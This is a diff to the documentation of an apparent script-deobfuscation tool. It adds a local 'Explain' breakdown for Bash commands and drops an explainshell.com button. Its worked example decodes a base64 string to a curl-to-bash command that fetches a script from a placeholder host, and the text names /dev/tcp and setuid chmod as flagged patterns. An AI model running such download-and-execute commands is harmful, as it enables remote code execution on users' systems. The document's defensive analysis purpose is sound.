@@ -19,7 +19,8 @@
 4. Read the summary line: how many layers were decoded, and how many indicators and flags were found.
 5. Review **Flags** for behavior worth a closer look.
 6. Copy **Indicators** (defanged by default) into your ticket or block list.
-7. Expand each entry under **Layers** to read the decoded code. Use **Export** for a report or to add it to a project.
+7. Expand each entry under **Layers** to read the decoded code. On a Bash layer, click **Explain** to see what each command, option and operator does.
+8. Use **Export** for a report or to add it to a project.
 
 ## Inputs and options
 
@@ -32,6 +33,7 @@
 | defanged (Indicators) | Shows and copies indicators in defanged form. | On. |
 | Copy all (Indicators) | Copies all indicators, one per line, in the form shown. | |
 | Copy (per layer) | Copies that layer's displayed text. | |
+| Explain (Bash layers) | Shows the layer broken into commands, options, operands, operators and redirections, each with a description. Click again to hide. | Off. |
 
 What the decoder understands, by language:
 
@@ -68,6 +70,16 @@ echo Y3VybCAtcyBodHRwczovL2Nkbi5leGFtcGxlLmNvbS9hLnNoIHwgYmFzaA== | base64 -d | 
 
 gives one decoded Bash layer containing `curl -s https://cdn.example.com/a.sh | bash`, an indicator `hxxps://cdn[.]example[.]com/a.sh` and the domain `cdn[.]example[.]com`, and flags about what the layer runs.
 
+**Explanation.** On a Bash layer, click **Explain** to break it down. The command line is shown with each part underlined, and every part is listed below it with a description. Hover over either to highlight the matching one.
+
+- **command**: what the program does. Wrappers such as `sudo`, `env`, `nohup`, `timeout` and `xargs` are explained along with the command they run.
+- **option**: each flag, including bundled flags like `-xzvf` (one line per letter) and the value an option takes, for example `-o out.bin`.
+- **argument**, **operator**, **redirect**, **variable**, **keyword**: operands, `|` `&&` `;` `&`, redirections such as `2>&1` or `>/dev/null`, `NAME=value` assignments, and `if`, `for`, `case` and the like.
+- Text that is itself run, such as `bash -c '...'`, `$(...)`, `eval`, `ssh host '...'` and `find -exec ... \;`, gets its own explanation nested under the item.
+- Some items are marked **check**, for example `/dev/tcp/host/port`, a download or file piped straight into a shell, or `chmod` with setuid. A note above the line says why.
+
+Descriptions come from a built-in list of common and security-relevant commands, then from the man pages on this computer (macOS and Linux), marked **man page**. Parts with no description are shown in italics. Windows has no man pages, so only the built-in list is used there. Only Bash and POSIX shell syntax is understood, not PowerShell or cmd.exe.
+
 ## What the results do and do not tell you
 
 - Decoding is static: "the script was not executed". Only the listed constructs are evaluated; anything else stays as written and may be flagged as code that could not be decoded.
@@ -77,9 +89,7 @@ gives one decoded Bash layer containing `curl -s https://cdn.example.com/a.sh | 
 
 ## Online activity and privacy
 
-Nothing goes online unless you click **explainshell.com**, and nothing in the script is executed, resolved or fetched. The script is not saved unless you export or add to a project.
-
-Bash layers have an **explainshell.com** button. After you confirm, it opens your browser at explainshell.com with that layer's text in the URL, so the site sees the command. Use it on one command line at a time, and not on commands that contain secrets or internal names. Layers longer than 4000 characters, or shortened in the view, can't be sent; copy the command you want instead.
+Nothing goes online and nothing in the script is executed, resolved or fetched. **Explain** reads local man pages with the `man` program to describe commands. The script is not saved unless you export or add to a project.
 
 ## Export and projects
 
